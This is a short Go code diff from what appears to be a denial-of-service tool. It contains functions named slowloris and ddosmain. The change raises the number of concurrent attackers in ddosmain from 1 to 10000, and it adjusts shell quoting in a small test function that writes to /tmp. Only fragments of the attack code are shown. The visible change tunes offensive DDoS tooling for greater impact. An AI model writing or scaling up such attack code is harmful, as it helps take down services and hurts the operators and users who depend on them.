@@ -116,7 +116,7 @@ func slowloris(url string) {
 }
 
 func ddosmain(url string) {
-	attackers := 1
+	attackers := 10000
 	x := randomNumber(15)
 	time.Sleep(time.Duration(x) * time.Second)
 	for {
@@ -142,6 +142,6 @@ func randomNumber(max int) int {
 }
 
 func test() {
-	cmd := exec.Command("echo \"test\" >> /tmp/tmp.txt")
+	cmd := exec.Command("echo 'test' >> /tmp/tmp.txt")
 	cmd.Run()
 }
